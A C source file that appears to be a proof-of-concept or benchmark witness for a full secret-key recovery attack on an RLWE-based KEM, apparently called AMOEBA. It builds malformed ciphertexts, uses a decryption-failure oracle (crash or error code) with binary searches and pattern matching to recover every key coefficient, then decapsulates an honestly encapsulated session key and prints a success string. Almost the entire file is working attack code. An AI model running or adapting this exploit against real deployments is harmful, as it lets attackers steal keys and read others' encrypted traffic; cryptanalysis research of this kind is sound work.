#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* Pull in the unmodified CPA implementation so its serialization helpers are
 * available to the witness.  The build omits the separate cpapke.c object. */
#include "cpapke.c"

void CCAKEM_Encaps(uint8_t ct[RLWE_CCA_CT_LEN], uint8_t key[RLWE_KEY_LEN],
                   const uint8_t pk[RLWE_CCA_PK_LEN]);
int CCAKEM_Decaps(uint8_t key[RLWE_KEY_LEN],
                  const uint8_t sk[RLWE_CCA_SK_LEN],
                  const uint8_t ct[RLWE_CCA_CT_LEN]);

static uint8_t secret_key[RLWE_CPA_SK_LEN];
static uint8_t public_key[RLWE_CPA_PK_LEN];
static long queries;
static int delta_coefficient = 200;
static int monomial_shift;

/* A pre-FO decryption-failure oracle.  A remote service exposes the same bit
 * through the propagated return code or, for the buggy weight-two path, a
 * crash.  Forking contains that submitted out-of-bounds write. */
static int oracle(int probe, int probe_value, int pilot, int pilot_value) {
    CTXT ct;
    uint8_t encoded[RLWE_CPA_CT_LEN];
    memset(&ct, 0, sizeof(ct));
    ct.c1[monomial_shift] = delta_coefficient;
    ct.c2[probe] = (int16_t)probe_value;
    ct.c2[pilot] = (int16_t)pilot_value;
    Compress_CT(encoded, &ct);
    queries++;

    pid_t child = fork();
    if (child == 0) {
        uint8_t message[RLWE_MSG_LEN];
        if (freopen("/dev/null", "w", stderr) == NULL)
            _exit(2);
        int result = CPAPKE_Decrypt(message, secret_key, encoded);
        _exit(result == 0 ? 0 : 1);
    }
    if (child < 0) {
        perror("fork");
        exit(2);
    }
    int status;
    if (waitpid(child, &status, 0) != child) {
        perror("waitpid");
        exit(2);
    }
    if (WIFSIGNALED(status))
        return 1;
    return WEXITSTATUS(status) != 0;
}

static int c2_roundtrip(int value) {
    int packed = ((value << RLWE_D2) + RLWE_Q / 2) / RLWE_Q;
    return (packed * RLWE_Q + (1 << (RLWE_D2 - 1))) >> RLWE_D2;
}

/* Match the complete 5-bit c2 response pattern rather than trusting one
 * rounded transition.  product_sign describes the selected negacyclic fold. */
static int recover_pattern(int target, int pilot, int pilot_value,
                           int delta, int product_sign) {
    int observed[32];
    for (int k = 0; k < 32; k++) {
        int raw = (k * RLWE_Q + 16) / 32;
        observed[k] = oracle(target, raw, pilot, pilot_value);
    }

    int best = 0;
    int best_error = 1000;
    for (int secret = -16; secret <= 16; secret++) {
        int error = 0;
        for (int k = 0; k < 32; k++) {
            int raw = (k * RLWE_Q + 16) / 32;
            int value = c2_roundtrip(raw) - product_sign * delta * secret;
            value %= RLWE_Q;
            if (value < 0)
                value += RLWE_Q;
            int bit = ((((value << 1) + (RLWE_Q >> 1)) / RLWE_Q) & 1);
            error += bit != observed[k];
        }
        if (error < best_error) {
            best_error = error;
            best = secret;
        }
    }
    return best;
}

int main(void) {
    CPAPKE_KeyGen(secret_key, public_key);

    CTXT probe;
    uint8_t encoded[RLWE_CPA_CT_LEN];
    CTXT decoded;
    memset(&probe, 0, sizeof(probe));
    probe.c1[0] = delta_coefficient;
    Compress_CT(encoded, &probe);
    Decompress_CT(&decoded, encoded);
    int delta = decoded.c1[0];

    /* The submitted key is read only for scoring. */
    CPASK submitted;
    Decompress_SK(&submitted, secret_key); /* SECRET-READ: scoring only */
    int16_t true_coefficients[RLWE_K * RLWE_N];
    memcpy(true_coefficients, submitted.s, sizeof(true_coefficients));
    InverseNussbamuer(true_coefficients, true_coefficients);
    PolyMod(true_coefficients, true_coefficients);
    for (int i = 0; i < RLWE_K * RLWE_N; i++) {
        int value = true_coefficients[i] % RLWE_Q;
        if (value < 0)
            value += RLWE_Q;
        if (value > RLWE_Q / 2)
            value -= RLWE_Q;
        true_coefficients[i] = (int16_t)value;
    }

    int16_t recovered[RLWE_K * RLWE_N];
    int pilot = 522;
    int pilot_value = 1729;
    int lower_boundary = RLWE_Q / 4;
    clock_t started = clock();

    /* Direct threshold scans recover the coordinates addressable through c2. */
    for (int index = 0; index < 522; index++) {
        int low = 0, high = 1728;
        if (!oracle(index, high, pilot, pilot_value)) {
            recovered[index] = 999;
            continue;
        }
        while (high - low > 2) {
            int middle = (low + high) / 2;
            if (oracle(index, middle, pilot, pilot_value))
                high = middle;
            else
                low = middle;
        }
        double estimate = (double)(((low + high) / 2) - lower_boundary) / delta;
        recovered[index] = (int16_t)(estimate < 0 ? estimate - 0.5 : estimate + 0.5);
    }

    /* Re-probe large values with a smaller scalar. */
    delta_coefficient = 120;
    memset(&probe, 0, sizeof(probe));
    probe.c1[0] = delta_coefficient;
    Compress_CT(encoded, &probe);
    Decompress_CT(&decoded, encoded);
    int small_delta = decoded.c1[0];
    for (int index = 0; index < 522; index++) {
        if (recovered[index] != 999)
            continue;
        int low = 0, high = 2400;
        if (!oracle(index, high, pilot, pilot_value))
            continue;
        while (high - low > 2) {
            int middle = (low + high) / 2;
            if (oracle(index, middle, pilot, pilot_value))
                high = middle;
            else
                low = middle;
        }
        double estimate = (double)(((low + high) / 2) - lower_boundary) / small_delta;
        recovered[index] = (int16_t)(estimate < 0 ? estimate - 0.5 : estimate + 0.5);
    }

    /* Further extension to Xiong and Wang's analysis: shifted monomials expose
     * all 54 coordinates outside c2.  First recover s[522] using known s[0]. */
    monomial_shift = RLWE_K * RLWE_N - RLWE_ECC_N + 1;
    memset(&probe, 0, sizeof(probe));
    probe.c1[monomial_shift] = delta_coefficient;
    Compress_CT(encoded, &probe);
    Decompress_CT(&decoded, encoded);
    int shifted_delta = decoded.c1[monomial_shift];
    recovered[522] = recover_pattern(0, monomial_shift,
                                     RLWE_Q / 2 + shifted_delta * recovered[0],
                                     shifted_delta, -1);

    /* Correct the first scan with full response patterns and the recovered
     * pilot, then obtain every tail coordinate with one folded impulse. */
    monomial_shift = 0;
    memset(&probe, 0, sizeof(probe));
    probe.c1[0] = delta_coefficient;
    Compress_CT(encoded, &probe);
    Decompress_CT(&decoded, encoded);
    delta = decoded.c1[0];
    for (int index = 0; index < 518; index++)
        recovered[index] = recover_pattern(index, 522,
                                           RLWE_Q / 2 + delta * recovered[522],
                                           delta, +1);

    for (int index = 518; index < RLWE_K * RLWE_N; index++) {
        monomial_shift = RLWE_K * RLWE_N - index;
        memset(&probe, 0, sizeof(probe));
        probe.c1[monomial_shift] = delta_coefficient;
        Compress_CT(encoded, &probe);
        Decompress_CT(&decoded, encoded);
        shifted_delta = decoded.c1[monomial_shift];
        recovered[index] = recover_pattern(
            0, monomial_shift, RLWE_Q / 2 + shifted_delta * recovered[0],
            shifted_delta, -1);
    }

    int correct = 0;
    for (int index = 0; index < RLWE_K * RLWE_N; index++)
        correct += recovered[index] == true_coefficients[index]; /* scoring */

    /* Serialize the recovered coefficient vector into a fresh decapsulation
     * key, then recover an honestly encapsulated session key.  The rejection
     * seed is unknown but is not used on an accepted ciphertext. */
    int16_t evaluation[RLWE_K * RLWE_N];
    ForwardNussbamuer(evaluation, recovered);
    CPASK recovered_secret;
    PolyMod(recovered_secret.s, evaluation);
    uint8_t recovered_cpa_key[RLWE_CPA_SK_LEN];
    Compress_SK(recovered_cpa_key, &recovered_secret);

    uint8_t recovered_cca_key[RLWE_CCA_SK_LEN] = {0};
    memcpy(recovered_cca_key, recovered_cpa_key, RLWE_CPA_SK_LEN);
    memcpy(recovered_cca_key + RLWE_CPA_SK_LEN, public_key, RLWE_CPA_PK_LEN);
    uint8_t ciphertext[RLWE_CCA_CT_LEN];
    uint8_t expected_key[RLWE_KEY_LEN], obtained_key[RLWE_KEY_LEN];
    CCAKEM_Encaps(ciphertext, expected_key, public_key);
    int decaps_result = CCAKEM_Decaps(obtained_key, recovered_cca_key, ciphertext);
    int shared_secret_match = decaps_result == 0 &&
        memcmp(expected_key, obtained_key, RLWE_KEY_LEN) == 0;

    double cpu_seconds = (double)(clock() - started) / CLOCKS_PER_SEC;
    printf("recovered=%d/%d queries=%ld cpu_seconds=%.2f shared_secret_match=%s\n",
           correct, RLWE_K * RLWE_N, queries, cpu_seconds,
           shared_secret_match ? "yes" : "no");

    if (correct != RLWE_K * RLWE_N || !shared_secret_match)
        return 1;
    puts("AMOEBA_DFO_FULL_KEY_RECOVERY_CONFIRMED");
    return 0;
}
